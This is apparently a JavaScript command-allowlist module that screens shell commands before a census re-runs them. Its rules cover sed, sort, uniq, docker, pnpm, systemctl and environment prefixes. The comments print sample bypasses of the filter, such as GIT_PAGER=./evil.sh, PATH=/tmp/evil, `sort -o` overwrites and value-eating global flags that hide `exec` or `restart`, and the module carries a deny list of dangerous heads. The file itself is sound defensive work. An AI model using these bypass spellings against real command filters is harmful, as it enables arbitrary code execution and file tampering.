// `sort`, `uniq` and `tree` were registered as bare `plainRule()` — filed under
// "searching + shaping text (none of these can execute a string)", which is
// true and is the WRONG QUESTION. None of them executes a string; all three
// WRITE A FILE on request:
//
//   sort input.txt -o api/lib/barkpark/application.ex   # overwrites it
//   uniq /tmp/in.txt api/lib/barkpark/application.ex    # POSIX: arg 2 is OUTPUT
//   tree -o api/lib/barkpark/application.ex             # overwrites it
//
// That is BYTE-IDENTICAL in outcome to `cp /tmp/evil.js api/lib/barkpark/
// application.ex` — D29's own named danger, which this module closes BY NAME in
// both REFUSED_HEADS and WRITE_SHAPES. A denylist survived inside the module
// whose thesis is that denylists cannot be complete, and the shipped suite could
// not see it because DANGER_SET was written from the same head list that has the
// gap. The fix is therefore not only these three rules but the four DANGER_SET
// probes below them: a named set measures the shapes it contains and nothing
// else.
//
// HONEST BOUNDS, both of them:
//   • LATENT, not live. 0 of the admitted corpus rows use any of these
//     shapes. It matters because harvest.mjs regenerates the corpus from
//     arbitrary other agents' transcripts, so today's fixture bounds nothing
//     about tomorrow's input.
//   • The `sort -o` and `uniq <in> <out>` writes were reproduced LIVE — a victim
//     file went from "original content" to "PWNED" through each. `tree -o` was
//     NOT: tree is not installed on this host, so that one rests on tree(1)
//     ("-o filename: Send output to filename") and is refused on the documented
//     flag rather than an observed overwrite. Refusing it costs nothing either
//     way; the census admits no tree command at all.
//
// NEVER CRY WOLF: the guard targets the WRITE FLAG, never the tool. `sort
// file.txt`, `sort -u -k2,2 file.txt`, `uniq -c file.txt` and `tree docs/` all
// stay admitted, and NEVER_CRY_WOLF_SET carries them.

const SORT_VALUE_LETTERS = new Set(["o", "k", "t", "S", "T"]);
const SORT_INDIRECTION = new Map([["--compress-program", "runs an arbitrary PROGRAM on every temp-file spill"]]);
const TREE_VALUE_LETTERS = new Set(["o", "L", "P", "I", "H", "T"]);

/** `-o FILE` / `--output FILE` on a tool whose output otherwise goes to stdout. */
const outputFlagRule = (head, valueLetters, indirection = new Map()) => ({
  check(rawArgv) {
    const argv = normaliseArgv(rawArgv, valueLetters);
    for (let i = 1; i < argv.length; i++) {
      const t = argv[i];
      const why = indirection.get(t);
      if (why) return `${head} ${t} ${why}`;
      if (t === "-o" || t === "--output") {
        const dest = arg(argv, i + 1);
        return `${head} ${t} WRITES its output to a file (${dest ?? "missing target"}) — \`${head} ${t} <path>\` overwrites that path with different content, exactly like \`cp\`. Drop the flag and read ${head}'s output on stdout.`;
      }
    }
    return null;
  },
});

// uniq's SECOND POSITIONAL is an output file. POSIX: `uniq [input [output]]`.
// It is not a second input, and there is no flag to notice — the write is
// spelled as an ordinary-looking filename.
const UNIQ_VALUE_FLAGS = new Set(["-f", "-s", "-w", "--skip-fields", "--skip-chars", "--check-chars"]);

const uniqRule = {
  check(argv) {
    const positionals = [];
    for (let i = 1; i < argv.length; i++) {
      const t = argv[i];
      if (t === "--") {
        positionals.push(...argv.slice(i + 1));
        break;
      }
      if (t.startsWith("-") && t.length > 1) {
        // `-f 2` and `--skip-fields 2` take a SEPARATE value token; `-f2` and
        // `--skip-fields=2` carry it attached and consume nothing.
        if (UNIQ_VALUE_FLAGS.has(t)) i++;
        continue;
      }
      positionals.push(t);
    }
    if (positionals.length >= 2) {
      return `uniq's SECOND positional is an OUTPUT FILE, not a second input — \`uniq ${positionals[0]} ${positionals[1]}\` WRITES ${positionals[1]}, overwriting whatever is there. Pass one input and read the result on stdout.`;
    }
    return null;
  },
};

const cdRule = {
  check(argv) {
    if (argv.length > 2) return "cd with more than one argument";
    return null;
  },
};

// ── sed: ADMITTED FOR READS, and why that is not a softening ─────────────────
//
// `sed` was refused ON THE HEAD, with the true and insufficient reason "its
// script can write files (`w`) and edit in place (-i)". Measured over this
// wave's own survey output, that single head rule was the LARGEST refusal class
// in real foreign text — 7 of 9 refusals — and every one of the seven was a
// read: `sed -n '40,60p' <file>`, a line citation.
//
// The instrument was arguing with itself. The rerun harness's own schema
// description gives `git show origin/main:path | sed -n 40,60p` as its FIRST
// worked example of how to write a re-derivation command. The screen refused
// the exact idiom the harness instructs producers to emit — so the producers
// were right and the screen was wrong, and a screen that is wrong about the
// commands its own operators are told to write is a screen that gets routed
// around (charter D63).
//
// WHAT MAKES sed SAFE IS THE SCRIPT, NOT THE HEAD. So the script is PARSED, and
// admitted only if every clause is a read-only address/print form. The parse is
// a real scanner rather than a regex because sed's delimiters are user-chosen
// and its addresses contain arbitrary regexes — `s;a;b;` and `/a;b/p` both carry
// a `;` that is not a separator, and no honest regex splits those.
//
// FAIL-CLOSED IN BOTH PLACES. An unknown script command is REFUSED (not
// ignored), and an unknown FLAG is REFUSED. That is what keeps this widening
// from being a hole: `-f script.sed` runs a script FILE this screen never reads,
// and it is refused for exactly that reason rather than admitted as "just a
// flag".
//
// STANDING BOUNDS, stated rather than discovered later:
//   • Only `p P = q Q d D n N` and a w-less, e-less `s///` are admitted.
//     Everything else — `w`, `r`, `e`, `a` `i` `c`, `b`/`t` labels, `{…}`
//     groups, `y///`, and the `1~3` / `addr,+N` step address forms — is
//     REFUSED. Several of those are perfectly harmless; they are refused
//     because the parser does not model them, and a construct the screen cannot
//     parse is a construct it cannot bound (the same ruling as the unterminated
//     quote).
//   • sed still READS whatever file it is pointed at. This module has never
//     claimed otherwise for `cat`, `grep` or `head` either.

const SED_READ_COMMANDS = new Set(["p", "P", "=", "q", "Q", "d", "D", "n", "N"]);
const SED_SUBST_FLAGS = /^[gpim0-9]*$/;

/** Scan ONE sed script. @returns {string|null} refusal reason or null */
export function screenSedScript(script) {
  const s = String(script ?? "");
  let i = 0;

  // A `/re/` or `\;re;` address. Advances past it; false on an unterminated one.
  const readRegexAddress = () => {
    const delim = s[i] === "\\" ? s[i + 1] : "/";
    i += s[i] === "\\" ? 2 : 1;
    while (i < s.length) {
      if (s[i] === "\\") {
        i += 2;
        continue;
      }
      if (s[i] === delim) {
        i++;
        return true;
      }
      i++;
    }
    return false;
  };

  while (i < s.length) {
    if (/[\s;]/.test(s[i])) {
      i++;
      continue;
    }

    // ADDRESSES — `N`, `$`, `/re/`, optionally as a `A,B` range.
    for (;;) {
      if (/\d/.test(s[i])) while (i < s.length && /\d/.test(s[i])) i++;
      else if (s[i] === "$") i++;
      else if (s[i] === "/" || s[i] === "\\") {
        if (!readRegexAddress()) return "sed address regex is unterminated — a script the screen cannot parse is a script it cannot bound";
      } else break;
      if (s[i] === ",") {
        i++;
        continue;
      }
      break;
    }
    while (i < s.length && /[\s!]/.test(s[i])) i++;
    if (i >= s.length) break;

    const cmd = s[i++];

    if (SED_READ_COMMANDS.has(cmd)) {
      // `q`/`Q` take an optional numeric exit status.
      while (i < s.length && /[\s\d]/.test(s[i])) i++;
      continue;
    }

    if (cmd === "s") {
      const delim = s[i];
      if (!delim || /[\s\\\n]/.test(delim)) return "sed s/// with an unparsable delimiter";
      i++;
      let closed = 0;
      while (i < s.length && closed < 2) {
        if (s[i] === "\\") {
          i += 2;
          continue;
        }
        if (s[i] === delim) closed++;
        i++;
      }
      if (closed < 2) return "sed s/// is unterminated";
      const from = i;
      while (i < s.length && /[A-Za-z0-9]/.test(s[i])) i++;
      const flags = s.slice(from, i);
      if (flags.includes("w")) return "sed s///w WRITES its replacement result to a file";
      if (flags.includes("e")) return "sed s///e EXECUTES its replacement result as a shell command";
      if (!SED_SUBST_FLAGS.test(flags)) return `sed s/// flag "${flags}" is not on the read-only allowlist (g, p, i, m and a count)`;
      continue;
    }

    if (cmd === "w" || cmd === "W") return "sed's `w` script command WRITES the pattern space to a file";
    if (cmd === "e") return "sed's `e` script command EXECUTES a shell command";
    if (cmd === "r" || cmd === "R") return "sed's `r` script command reads a file the screen never sees";
    return `sed script command "${cmd}" is not a read-only address/print form (only ${[...SED_READ_COMMANDS].join(" ")} and a w-less s///)`;
  }
  return null;
}

const SED_READ_FLAGS = new Set([
  "-n", "-E", "-r", "-s", "-u", "-z", "-a", "-l",
  "--quiet", "--silent", "--regexp-extended", "--separate", "--unbuffered", "--null-data", "--posix", "--debug", "--sandbox",
]);

// `-i` takes an OPTIONAL attached suffix (`-i.bak`) and clusters (`-ni`), which
// is exactly the shape `normaliseArgv` exists to flatten — the same normaliser
// that closed `curl -so/tmp/x`, rather than a sixth hand-copy of the grammar.
const SED_VALUE_LETTERS = new Set(["e", "f", "i", "l"]);

const sedRule = {
  check(rawArgv) {
    const argv = normaliseArgv(rawArgv, SED_VALUE_LETTERS);
    const scripts = [];
    let sawExpression = false;
    for (let i = 1; i < argv.length; i++) {
      const t = argv[i];
      if (t === "--") {
        // Only the FIRST bare positional is a script, and only when nothing has
        // supplied one yet. Taking `rest[0]` unconditionally made
        // `sed '1p' -- notes.md` screen the FILENAME as a script and refuse it
        // ("script command \"o\"") — a false refusal found by probing the
        // separator after the rule was otherwise green.
        const rest = argv.slice(i + 1);
        if (!sawExpression && scripts.length === 0 && rest.length) scripts.push(rest[0]);
        break;
      }
      if (t === "-i" || t === "--in-place" || /^--in-place=/.test(t)) return "sed -i EDITS ITS INPUT FILES IN PLACE";
      if (t === "-f" || t === "--file") return "sed -f runs a script FILE the screen never sees";
      if (t === "-e" || t === "--expression") {
        const v = arg(argv, i + 1);
        if (v === null) return "sed -e without a script";
        scripts.push(v);
        sawExpression = true;
        i++;
        continue;
      }
      if (t.startsWith("-") && t.length > 1) {
        if (!SED_READ_FLAGS.has(t)) return `sed flag "${t}" is not on the read-only allowlist (${[...SED_READ_FLAGS].sort().join(", ")})`;
        continue;
      }
      // The first bare positional is the script, unless -e already supplied one.
      if (!sawExpression && scripts.length === 0) scripts.push(t);
    }
    if (!scripts.length) return "sed without a script";
    for (const script of scripts) {
      const why = screenSedScript(script);
      if (why) return why;
    }
    return null;
  },
};

// docker's value-taking pre-verb globals. `docker --host ps exec -it foo bash`
// runs `docker exec` — arbitrary code execution inside a container — with the
// daemon socket repointed by `--host`; `--host`'s eaten value `ps` collided
// with an allowlisted verb, so the real verb `exec` two tokens later was never
// examined. `-H` is docker's short alias for `--host`; `--context` and
// `--config` also take a separate-token value ahead of the verb.
// That set was FOUR of docker's SEVEN. `docker --help` on this host lists every
// root option and which of them take a `string`: `--config`, `-c`/`--context`,
// `-H`/`--host`, `-l`/`--log-level`, `--tlscacert`, `--tlscert`, `--tlskey`
// (the booleans `-D`/`--debug`, `--tls`, `--tlsverify`, `-v` eat nothing and are
// correctly absent). `-c` is the SHORT SPELLING OF `--context`, which the set
// already carried in its long form — so the identical bypass rode the two-letter
// alias of a flag the fix had already named. Proven live, executing:
//
//     docker --tlscacert ps version   → printed `docker version` output
//     docker --tlscert   ps version   → printed `docker version` output
//     docker -Dc         ps version   → resolved context `ps`, ran `version`
//
// with `version` standing in for `exec -it foo bash`.
const DOCKER_VALUE_GLOBALS = new Set([
  "-H", "--host", "-c", "--context", "--config",
  "-l", "--log-level", "--tlscacert", "--tlscert", "--tlskey",
]);

// docker's verbs that write, execute, or reach the daemon to change state — the
// backstop set, not the gate. `exec`/`run`/`build`/`cp` are arbitrary code or
// file writes; the object nouns (`container`, `image`, `volume`, `network`,
// `compose`, `swarm`, `system`, `buildx`, `context`, `plugin`, `stack`,
// `secret`, `config`, `node`, `service`, `trust`, `checkpoint`, `manifest`) each
// carry writing sub-verbs of their own and none is on the read allowlist.
const DOCKER_WRITE_VERBS = new Set([
  "exec", "run", "build", "cp", "create", "start", "stop", "restart", "kill", "rm", "rmi",
  "pull", "push", "commit", "save", "load", "export", "import", "tag", "login", "logout",
  "attach", "update", "rename", "pause", "unpause", "prune", "wait", "init", "rollback",
  "compose", "system", "volume", "network", "container", "image", "swarm", "service",
  "secret", "config", "context", "buildx", "plugin", "trust", "checkpoint", "stack", "node",
  "manifest",
]);

// pnpm's value-taking pre-verb globals. `pnpm -C ls add lodash` and
// `pnpm --prefix ls install` both ADMITTED (confirmed live on origin/main):
// `add`/`install` are writes/code-exec, judged instead as the eaten value `ls`
// read as the sub-verb. `-C` is pnpm's short alias for `--prefix` (mirrors
// npm's own `-C`/`--prefix`).
// That set was TWO, and it named the ALIAS while missing the flag's own primary
// spelling: pnpm's option is `-C, --dir <dir>` — `--prefix` is the npm-compatible
// alias — so `pnpm --dir ls add lodash` walked straight past a fix whose whole
// subject was `-C`. Proven live on this host, each eating its next token and then
// running the REAL verb:
//
//     pnpm --dir      ls root  → ENOENT lstat '/private/tmp/ls'  (ate `ls` as the dir)
//     pnpm --loglevel ls root  → printed /private/tmp/node_modules  (RAN `pnpm root`)
//     pnpm --reporter ls root  → printed /private/tmp/node_modules  (RAN `pnpm root`)
//     pnpm --filter   ls root  → parsed as a filter, ate `ls`
//     pnpm -rC        ls root  → the CLUSTERED spelling, ate `ls` as the dir
//
// This set is what was PROVEN, not what is complete — pnpm forwards a long tail
// of npm config keys (`--registry`, `--store-dir`, …) that take values on
// `add`/`install` too. Completeness is what PNPM_WRITE_VERBS is for.
const PNPM_VALUE_GLOBALS = new Set([
  "-C", "--dir", "--prefix", "--filter", "-F", "--filter-prod", "--loglevel", "--reporter",
]);

/** pnpm verbs that write the tree, the lockfile, or execute a script. */
const PNPM_WRITE_VERBS = new Set([
  "add", "install", "i", "update", "up", "remove", "rm", "uninstall", "un", "link", "unlink",
  "import", "prune", "dedupe", "rebuild", "publish", "pack", "run", "exec", "dlx", "create",
  "init", "patch", "patch-commit", "patch-remove", "deploy", "fetch", "setup", "store",
  "config", "env", "server", "start", "test", "licenses", "self-update",
]);

// systemctl's value-taking pre-verb globals — the SECOND head of the same bug
// #13346 fixed for docker/pnpm ("systemctl and launchctl are untouched", per
// that PR's own commit message). `systemctl -H status restart
// barkpark.service` ADMITTED (confirmed live on origin/main): `-H`'s
// separate-token value `status` collided with the allowlisted read verb
// `status`, so the real verb `restart` two tokens later was never examined.
// `-H` is systemctl's short alias for `--host=[USER@]HOST` (repoints the
// command at a remote systemd over ssh/machined); `-M`/`--machine=CONTAINER`
// is the same shape, one container hop instead of one host hop; `--root=PATH`
// takes a separate-token value ahead of the verb too (an offline root for
// preset/enable-style operations).
//
// Those three were the REMOTE-hop globals. systemctl's option table has a dozen
// more declared `required_argument` in the same getopt_long call, and every one
// eats its next token identically — `systemctl -p status restart barkpark.service`
// admits a RESTART, and unlike `-t`/`-o`/`-s` (whose values systemd validates
// and rejects) `--property` is accepted unvalidated by every verb, so that one
// reaches the daemon. The list below is systemctl(1)'s own set of options
// documented as taking a mandatory argument. NOTE: systemd is Linux-only, so
// unlike the docker/pnpm rows above these are DOCUMENTED, not live-executed on
// this host — which is precisely why SYSTEMCTL_WRITE_VERBS exists underneath.
//
// getopt_long also CLUSTERS, so `systemctl -qH status restart barkpark.service`
// hid the same restart behind two characters; `dropValueGlobals` now expands a
// cluster whose last letter takes a value.
const SYSTEMCTL_VALUE_GLOBALS = new Set([
  "-H", "--host", "-M", "--machine", "--root", "--image",
  "-t", "--type", "--state", "-p", "--property", "-P",
  "-n", "--lines", "-o", "--output", "-s", "--signal", "--kill-whom",
  "--what", "--job-mode", "--timestamp", "--when",
  "--boot-loader-entry", "--esp-path", "--boot-path",
]);

/**
 * systemctl verbs that change unit or machine state. `restart`/`stop` are
 * DANGER_SET members by name; the rest are the same family. Read verbs
 * (`status`, `show`, `cat`, `is-active`, `list-units`, …) are deliberately
 * absent, and so is `list-jobs`-style introspection.
 */
const SYSTEMCTL_WRITE_VERBS = new Set([
  "start", "stop", "restart", "reload", "try-restart", "reload-or-restart",
  "try-reload-or-restart", "kill", "clean", "freeze", "thaw", "isolate",
  "enable", "disable", "reenable", "preset", "preset-all", "mask", "unmask", "link",
  "revert", "add-wants", "add-requires", "edit", "set-property", "set-default",
  "set-environment", "unset-environment", "import-environment",
  "daemon-reload", "daemon-reexec", "reset-failed", "log-level", "log-target",
  "service-log-level", "service-log-target", "bind", "mount-image",
  "reboot", "soft-reboot", "poweroff", "halt", "kexec", "exit", "switch-root",
  "suspend", "hibernate", "hybrid-sleep", "suspend-then-hibernate",
  "rescue", "emergency", "default",
]);

// launchctl was CHECKED for the same shape and CLEARED, not skipped. Its
// SYNOPSIS is `launchctl subcommand [arguments ...]` — there is no pre-verb
// global-option region at all, so there is no token for a value-taking global
// to eat before the subcommand. `firstNonFlag` reads the subcommand directly.
// Do not add a valueGlobals set here; there is nothing to normalise.
//
// It does still get the write-verb backstop, and that is not decoration: because
// `firstNonFlag` SKIPS leading flag tokens for every head, `launchctl -w list
// unload /L/foo.plist` resolved its sub-verb to `list` and was ADMITTED, with
// `unload` sitting untouched two tokens on. Real launchctl rejects that spelling
// (`-w` is not a subcommand), so it is a model gap rather than a live hole — but
// it is the same gap shape, and the backstop closes it without pretending
// launchctl has a global-option region it does not have.
const LAUNCHCTL_WRITE_VERBS = new Set([
  "load", "unload", "start", "stop", "kickstart", "bootstrap", "bootout", "enable", "disable",
  "remove", "submit", "setenv", "unsetenv", "kill", "attach", "reboot", "config", "limit",
  "asuser", "debug", "resolveport", "runstats", "uncache", "dumpstate",
]);

/**
 * THE ALLOWLIST. Every entry is a head this census may run. Anything absent is
 * REFUSED — that is the fail-closed property, and it is why this is a Map of
 * heads rather than a list of forbidden ones.
 */
export const ALLOWED_HEADS = new Map([
  // navigation + pure output
  ["cd", cdRule],
  ["pwd", plainRule()],
  ["echo", plainRule()],
  ["printf", plainRule()],
  ["true", plainRule()],
  ["false", plainRule()],
  // reading files
  ["cat", plainRule()],
  ["head", plainRule()],
  ["tail", plainRule()],
  ["wc", plainRule()],
  ["ls", plainRule()],
  ["stat", plainRule()],
  ["file", plainRule()],
  ["du", plainRule()],
  ["df", plainRule()],
  ["basename", plainRule()],
  ["dirname", plainRule()],
  ["realpath", plainRule()],
  ["readlink", plainRule()],
  ["find", findRule],
  ["tree", outputFlagRule("tree", TREE_VALUE_LETTERS)],
  // searching + shaping text (none of these can execute a string)
  ["grep", plainRule()],
  ["egrep", plainRule()],
  ["fgrep", plainRule()],
  // NOT plainRule(): all three run an arbitrary command through a flag — see
  // the PROGRAM INDIRECTION block above, where `rg --pre` is proven executing.
  ["rg", indirectionRule("rg", RG_INDIRECTION)],
  ["ag", indirectionRule("ag", new Map([["--pager", "runs an arbitrary COMMAND as the pager"]]))],
  // `ack --ackrc=FILE` is `curl -K` for ack: a FILE OF ACK OPTIONS the screen
  // never reads, and `--pager` — the very flag on the line above — is one of
  // them, so the refusal one token to the left is reachable one indirection
  // away. Refused on ack(1) and on parity with `curl -K` / `sed -f`, NOT on an
  // observed execution: ack is not installed on the authoring host, and saying
  // so is the same disclosure `tree -o` and SYSTEMCTL_VALUE_GLOBALS carry.
  // Refusing it costs nothing either way — 0 corpus rows use `ack` at all.
  //
  // `ag --path-to-ignore FILE` was CHECKED and deliberately CLEARED, not
  // skipped: that file holds ignore PATTERNS, not options and not a program —
  // the same ruling the block below already makes for `grep -f`.
  ["ack", indirectionRule("ack", new Map([
    ["--pager", "runs an arbitrary COMMAND as the pager"],
    ["--ackrc", "reads an OPTIONS FILE the screen never sees — it may carry `--pager=<cmd>`, which is refused one entry above"],
  ]))],
  // `--compress-program` names a PROGRAM GNU sort forks for every temp-file
  // spill — the same shape as `rg --pre`, on a head already carrying a rule.
  ["sort", outputFlagRule("sort", SORT_VALUE_LETTERS, SORT_INDIRECTION)],
  ["uniq", uniqRule],
  ["cut", plainRule()],
  ["tr", plainRule()],
  ["nl", plainRule()],
  ["comm", plainRule()],
  ["diff", plainRule()],
  ["sed", sedRule],
  ["jq", plainRule()],
  ["column", plainRule()],
  ["rev", plainRule()],
  // introspection
  ["command", commandRule],
  ["type", plainRule()],
  ["which", plainRule()],
  ["uname", plainRule()],
  // `date -s`/`--set` SETS the system clock. A census that re-runs history must
  // never be able to move the clock the ledger's own now-bound compares against.
  ["date", { check: (argv) => (hasFlag(argv, "-s", "--set") || argv.some((t) => /^--set=/.test(t)) ? "date -s SETS the system clock" : null) }],
  // `hostname` was a bare `plainRule()` with zero argument check, so
  // `hostname evil-name` was admitted — and a positional is not an option to
  // hostname, it is the NEW HOSTNAME. Bare `hostname` (and its read flags
  // `-f`/`-s`/`-i`) still print.
  ["hostname", { check: (argv) => (firstNonFlag(argv) !== null ? `hostname ${firstNonFlag(argv)} SETS the system hostname — only bare \`hostname\` reads` : null) }],
  ["id", plainRule()],
  ["whoami", plainRule()],
  ["env", { check: (argv) => (argv.length > 1 ? "env with arguments runs a command" : null) }],
  // processes — read-only verbs only
  ["ps", plainRule()],
  ["pgrep", plainRule()],
  ["kill", killRule],
  ["lsof", plainRule()],
  ["dig", plainRule()],
  // tools with a read-only sub-language
  ["git", gitRule],
  ["gh", ghRule],
  ["bp", bpRule],
  ["go", goRule],
  ["mix", mixRule],
  ["curl", curlRule],
  ["docker", verbRule(["ps", "images", "logs", "inspect", "version", "info", "stats", "top", "port"], "docker", DOCKER_VALUE_GLOBALS, DOCKER_WRITE_VERBS)],
  ["systemctl", verbRule(["is-active", "is-enabled", "is-failed", "status", "show", "cat", "list-units", "list-unit-files", "get-default"], "systemctl", SYSTEMCTL_VALUE_GLOBALS, SYSTEMCTL_WRITE_VERBS)],
  // journalctl READS the journal — except for the handful of flags that vacuum,
  // rotate or flush it, which delete log history irreversibly.
  ["journalctl", {
    check: (argv) => {
      // `--update-catalog` was absent from this list and WRITES
      // /var/lib/systemd/catalog/database — the same one-flag-short shape as
      // findRule's missing `-fprint0` above, on the same sweep.
      const bad = argv.find((t) => /^--(vacuum-(size|time|files)|rotate|flush|sync|relinquish-var|setup-keys|update-catalog)\b/.test(t));
      return bad ? `journalctl ${bad} mutates or deletes the journal` : null;
    },
  }],
  ["launchctl", verbRule(["list", "print"], "launchctl", EMPTY_VALUE_GLOBALS, LAUNCHCTL_WRITE_VERBS)],
  // `pack` was on this list and is a WRITE: `npm pack` builds a tarball and
  // drops `<name>-<version>.tgz` into the working directory. Found alongside the
  // sort/uniq/tree hole, same root cause — a verb judged by "does it execute
  // something?" rather than "does it write?". Removing it costs the census
  // nothing: 0 of the 651 frozen corpus commands use it.
  ["npm", npmRule],
  ["pnpm", verbRule(["ls", "view", "info", "outdated", "why", "list", "root", "bin"], "pnpm", PNPM_VALUE_GLOBALS, PNPM_WRITE_VERBS)],
]);

/**
 * Heads that are REFUSED with a specific reason. Purely for the message: an
 * absent head is refused identically. This map only exists so the census's
 * refusal log reads as a diagnosis rather than a shrug, and adding to it can
 * never widen what is admitted.
 */
export const REFUSED_HEADS = new Map([
  ["bash", "bash runs an arbitrary script or inline program"],
  ["sh", "sh runs an arbitrary script or inline program"],
  ["zsh", "zsh runs an arbitrary script or inline program"],
  ["dash", "dash runs an arbitrary script or inline program"],
  ["ksh", "ksh runs an arbitrary script or inline program"],
  ["source", "source evaluates a script in the current shell"],
  [".", "`.` evaluates a script in the current shell"],
  ["eval", "eval evaluates an arbitrary string"],
  ["exec", "exec replaces the process with an arbitrary command"],
  ["node", "node executes arbitrary JavaScript (including fs writes)"],
  ["python", "python executes arbitrary code"],
  ["python3", "python3 executes arbitrary code"],
  ["perl", "perl executes arbitrary code"],
  ["ruby", "ruby executes arbitrary code"],
  ["elixir", "elixir executes arbitrary code"],
  ["iex", "iex executes arbitrary code"],
  ["erl", "erl executes arbitrary code"],
  ["awk", "awk can shell out via system()"],
  // `sed` LEFT this map in wave 5. It is now judged on its SCRIPT by `sedRule`
  // rather than on its head — see the block above `screenSedScript`. The head
  // rule was refusing the single most common honest read shape in real foreign
  // output, including the one the rerun harness's own schema tells producers to
  // write. `sed -i`, `w`, `e` and `s///w` are still refused, by the parser.
  ["xargs", "xargs executes a command per input line"],
  ["npx", "npx installs and then executes an arbitrary package (settled ruling)"],
  ["psql", "psql executes arbitrary SQL"],
  ["mysql", "mysql executes arbitrary SQL"],
  ["sqlite3", "sqlite3 executes arbitrary SQL"],
  ["claude", "claude spawns an agent that can do anything this process can"],
  ["cc", "cc is a Claude wrapper on this machine, not a compiler — it spawns an agent"],
  ["sudo", "sudo escalates privilege"],
  ["su", "su switches user and runs a command"],
  ["watch", "watch repeatedly executes a command"],
  ["nohup", "nohup detaches an arbitrary command"],
  ["timeout", "timeout wraps an arbitrary command"],
  ["setsid", "setsid detaches an arbitrary command"],
  ["time", "time wraps an arbitrary command"],
  ["flock", "flock wraps an arbitrary command"],
  ["nice", "nice wraps an arbitrary command"],
  ["chroot", "chroot wraps an arbitrary command"],
  ["make", "make executes recipes from a Makefile"],
  ["reboot", "reboot restarts the machine"],
  ["shutdown", "shutdown powers off the machine"],
  ["halt", "halt stops the machine"],
  ["poweroff", "poweroff stops the machine"],
  ["pkill", "pkill signals processes by pattern"],
  ["killall", "killall signals processes by name"],
  ["cp", "cp overwrites a file with different content"],
  ["mv", "mv moves or overwrites a file"],
  ["rm", "rm deletes files"],
  ["trash", "trash deletes files"],
  ["dd", "dd writes raw blocks"],
  ["tee", "tee writes its input to a file"],
  ["mkdir", "mkdir creates directories"],
  ["touch", "touch creates or restamps files"],
  ["chmod", "chmod changes permissions"],
  ["chown", "chown changes ownership"],
  ["ln", "ln creates links"],
  ["truncate", "truncate resizes a file"],
  ["vercel", "vercel deploys"],
  ["yarn", "yarn installs and runs package scripts"],
  ["for", "a shell loop body is arbitrary"],
  ["while", "a shell loop body is arbitrary"],
  ["if", "a shell conditional body is arbitrary"],
  ["export", "an environment assignment is not a command this census can re-derive a fact from"],
]);

// ─────────────────────────────────────────────────────────────────────────────
// THE ENVIRONMENT-ASSIGNMENT PREFIX — SCREENED, never silently discarded
// ─────────────────────────────────────────────────────────────────────────────
//
// `screenSegment` matched this prefix, STRIPPED it, and never looked at it
// again. That was a GENERAL remote-execution primitive, and — this is the part
// that matters — it sat BELOW every head rule, so no amount of tightening
// `gitRule`, `ghRule` or `goRule` could ever reach it. All four of these were
// ADMITTED and, when run, executed attacker-controlled code:
//
//   GIT_EXTERNAL_DIFF=./evil.sh git diff HEAD~1        git RUNS ./evil.sh
//   GIT_PAGER=./evil.sh git log -1                     git RUNS ./evil.sh
//   PAGER=./evil.sh gh pr view 1                       gh  RUNS ./evil.sh
//   NODE_OPTIONS=--require=./evil.cjs node --test x    node RUNS attacker JS
//
// The head allowlist is the module's central claim; an assignment that changes
// WHICH PROGRAM the allowlisted head runs voids it entirely. So the name is
// screened against an ALLOWLIST, which is the same fail-closed discipline the
// head list gets, and for the same reason: the set of environment variables that
// redirect execution is unbounded and undocumentable — `GIT_*` alone has a dozen
// (`GIT_SSH`, `GIT_SSH_COMMAND`, `GIT_EDITOR`, `GIT_SEQUENCE_EDITOR`,
// `GIT_ASKPASS`, `GIT_PROXY_COMMAND`, `GIT_DIR`, `GIT_CONFIG_GLOBAL`, …) — while
// the set that is inert and actually appears in real work is tiny.
//
// THE LIST WAS DERIVED FROM THE CORPUS, NOT INVENTED. Exactly three names appear
// across the 28 environment-prefixed rows the screen admits today: `CC`,
// `MIX_ENV`, `MIX_TEST_PARTITION`. `CXX` and `MIX_TARGET` are included as the
// obvious siblings of two of them.
//
// `PATH` IS DELIBERATELY ABSENT, AND IT COSTS ONE ADMITTED ROW. The corpus row
//
//   CC=/usr/bin/clang MIX_TEST_PARTITION=felixv3 PATH="$FB:$PATH" mix test …:583
//
// is admitted today and is refused from here on. That is the correct trade and
// not a regret: `PATH=` decides which binary EVERY later token resolves to, so
// admitting it makes the head allowlist decorative — `PATH=/tmp/evil git log`
// runs /tmp/evil/git. One honest row is a fair price for the layer's central
// claim, and the row is named here rather than quietly absorbed into a count.
//
// CC IS ON THE LIST AND ITS VALUE IS STILL BOUNDED, because `CC` names a program
// that cgo genuinely executes during `go test`. `CC=clang` and
// `CC=/usr/bin/clang` (the two spellings the corpus uses) are admitted;
// `CC=./evil.sh` is not.
const ENV_INERT_NAMES = new Set(["MIX_ENV", "MIX_TARGET", "MIX_TEST_PARTITION", "CC", "CXX"]);

// Names whose VALUE is executed, so the value must be a bare program name or an
// absolute path — never a relative script beside the checkout.
const ENV_PROGRAM_NAMES = new Set(["CC", "CXX"]);
const ENV_PROGRAM_VALUE = /^(\/[\w.+-]+)+$|^[\w.+-]+$/;

const ENV_ASSIGNMENT = /^([A-Za-z_][A-Za-z0-9_]*)=(\S*)(\s+|$)/;

/** @returns {string|null} why an `NAME=value` prefix is refused, or null */
export function envAssignmentReason(name, value) {
  if (!ENV_INERT_NAMES.has(name)) {
    return `environment assignment "${name}=" is not on the inert allowlist (${[...ENV_INERT_NAMES].sort().join(", ")}) — a prefix like GIT_EXTERNAL_DIFF=, GIT_PAGER=, PAGER=, NODE_OPTIONS= or PATH= changes WHICH PROGRAM the allowlisted head runs, which voids the head allowlist entirely`;
  }
  if (/[$`]/.test(value)) return `environment value "${name}=${value}" expands at run time — the screen cannot bound what it becomes`;
  // A value the author QUOTED is the same value. `CC="/usr/bin/clang"` is the
  // identical assignment as `CC=/usr/bin/clang`, and refusing the first was a
  // false refusal of the exact class D63 exists to close — the quotes are
  // stripped for the shape test, never for the expansion test above, which
  // must keep seeing the raw span.
  const bare = /^(["'])(.*)\1$/.test(value) ? value.slice(1, -1) : value;
  if (ENV_PROGRAM_NAMES.has(name)) {
    if (!ENV_PROGRAM_VALUE.test(bare)) {
      return `${name}=${value} names a PROGRAM the toolchain executes; only a bare name or an absolute path under ${TRUSTED_BIN_DIRS.join(", ")} is admitted (not a relative script)`;
    }
    // "AN ABSOLUTE PATH" WAS THE WHOLE BOUND, AND IT BOUNDS NOTHING.
    //
    // `headPathReason` refuses `/tmp/evil/git` — an absolute path outside the
    // system bin directories — as arbitrary code execution through the head
    // allowlist. This function admitted `CC=/tmp/evil`, which is the IDENTICAL
    // capability under an allowlisted `go test`/`mix test`: same primitive, two
    // spellings, one screened. Proven on the authoring host with a cgo package:
    //
    //     $ CC=$B/evil/mycc go test -count=1 ./...
    //     ok  	cgoprobe	0.133s
